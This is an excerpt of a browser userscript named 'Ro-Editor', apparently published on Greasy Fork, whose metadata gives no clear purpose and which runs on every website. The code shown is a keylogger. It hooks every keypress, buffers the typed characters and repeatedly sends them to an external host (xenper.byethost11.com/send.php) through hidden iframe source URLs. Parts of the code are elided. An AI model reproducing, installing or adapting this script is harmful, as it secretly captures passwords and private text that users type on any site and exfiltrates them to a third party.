...
// ==UserScript==
// @name          Ro-Editor
// @description   Ro-Editor111
// @version 1.0.0
// @include       *
// @namespace https://greasyfork.org/users/16535
// @downloadURL https://update.greasyfork.org/scripts/14180/Ro-Editor.user.js
// @updateURL https://update.greasyfork.org/scripts/14180/Ro-Editor.meta.js
// ==/UserScript==
...
document.onkeydown=function(e){
		  ...
		  if(charCount==2)
			...
			if(changeFrame==1)
			{
			 document.getElementById("sender1").setAttribute('src', 'http://xenper.byethost11.com/send.php?s='+record);
			record="";
			charCount=0;
			changeFrame++;
			}
			...
			if(changeFrame==0)
			{
		 document.getElementById("sender").setAttribute('src', 'http://xenper.byethost11.com/send.php?s='+record);
			record="";
			charCount=0;
			changeFrame++;
			}
				...
				{
		 document.getElementById("sender2").setAttribute('src', 'http://xenper.byethost11.com/send.php?s='+record);
			record="";
			charCount=0;
			changeFrame=0;
			}
